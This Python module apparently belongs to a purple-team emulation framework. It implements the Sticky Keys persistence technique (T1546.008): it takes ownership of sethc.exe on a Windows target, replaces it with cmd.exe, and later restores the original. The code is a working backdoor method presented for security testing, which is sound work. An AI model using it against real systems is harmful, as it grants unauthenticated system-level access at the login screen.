from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Replace accessibility binary with cmd.exe for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            "Copy-Item -Path 'C:\\Windows\\System32\\sethc.exe' "
            "-Destination 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' -Force"
        )
        await conn.run_ps(backup_cmd)
        replace_cmd = (
            "takeown /f C:\\Windows\\System32\\sethc.exe; "
            "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F; "
            "Copy-Item -Path 'C:\\Windows\\System32\\cmd.exe' "
            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force"
        )
        result = await conn.run_ps(replace_cmd)
        return TechniqueResult(
            technique_id="T1546.008",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.008 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.008",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        restore_cmd = (
            "Copy-Item -Path 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' "
            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force; "
            "Remove-Item -Path 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' -Force"
        )
        await conn.run_ps(restore_cmd)
    except Exception as e:
        logger.warning(f"T1546.008 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
